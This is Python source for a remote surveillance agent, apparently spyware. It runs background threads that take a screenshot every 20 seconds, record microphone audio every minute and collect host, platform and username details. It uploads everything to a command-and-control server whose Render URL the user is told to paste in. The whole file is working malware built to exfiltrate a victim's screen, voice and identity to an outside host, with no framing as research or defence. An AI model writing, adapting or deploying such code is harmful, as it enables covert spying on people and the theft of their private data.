import os
import time
import socket
import platform
import threading
import requests
from datetime import datetime
from PIL import ImageGrab
import sounddevice as sd
import numpy as np
from scipy.io.wavfile import write as write_wav

# ================== CONFIG ==================
# PASTE YOUR RENDER URL HERE
C2_URL = "https://c2-receiver.onrender.com"

TARGET_ID = socket.gethostname()
SCREEN_INTERVAL = 20
AUDIO_DURATION = 10
AUDIO_INTERVAL = 60
PUSH_INTERVAL = 30

LOG_DIR = "agent_data"
os.makedirs(os.path.join(LOG_DIR, "screenshots"), exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "audio"), exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "logs"), exist_ok=True)

def push_file(local_path, file_type):
    if not os.path.exists(local_path):
        return
    try:
        with open(local_path, "rb") as f:
            files = {"file": (os.path.basename(local_path), f)}
            data = {
                "target_id": TARGET_ID,
                "file_type": file_type
            }
            r = requests.post(
                f"{C2_URL}/upload",
                files=files,
                data=data,
                timeout=60
            )
            print(f"[+] {file_type}: {os.path.basename(local_path)} -> {r.status_code}")
    except Exception as e:
        print(f"[!] push error ({file_type}): {e}")

def capture_screen():
    while True:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(LOG_DIR, "screenshots", f"screen_{ts}.png")
        try:
            ImageGrab.grab().save(path)
            push_file(path, "screenshots")
        except Exception as e:
            print(f"[!] screen: {e}")
        time.sleep(SCREEN_INTERVAL)

def record_audio():
    while True:
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(LOG_DIR, "audio", f"audio_{ts}.wav")
        try:
            rec = sd.rec(
                int(AUDIO_DURATION * 44100),
                samplerate=44100,
                channels=1,
                dtype="float32"
            )
            sd.wait()
            write_wav(path, 44100, rec)
            push_file(path, "audio")
        except Exception as e:
            print(f"[!] audio: {e}")
        time.sleep(AUDIO_INTERVAL)

def heartbeat_and_info():
    while True:
        try:
            requests.post(
                f"{C2_URL}/ping",
                data={"target_id": TARGET_ID},
                timeout=15
            )
            info_path = os.path.join(LOG_DIR, "logs", "hostinfo.txt")
            with open(info_path, "w", encoding="utf-8") as f:
                f.write(f"time={datetime.now()}\n")
                f.write(f"host={socket.gethostname()}\n")
                f.write(f"platform={platform.platform()}\n")
                f.write(f"user={os.getenv('USERNAME') or os.getenv('USER')}\n")
            push_file(info_path, "logs")
        except Exception as e:
            print(f"[!] heartbeat: {e}")
        time.sleep(PUSH_INTERVAL)

if __name__ == "__main__":
    print(f"[*] Agent started")
    print(f"[*] Target ID : {TARGET_ID}")
    print(f"[*] C2 URL    : {C2_URL}")
    print("[*] Modules   : screen + audio + heartbeat")

    threading.Thread(target=capture_screen, daemon=True).start()
    threading.Thread(target=record_audio, daemon=True).start()
    threading.Thread(target=heartbeat_and_info, daemon=True).start()

    while True:
        time.sleep(60)
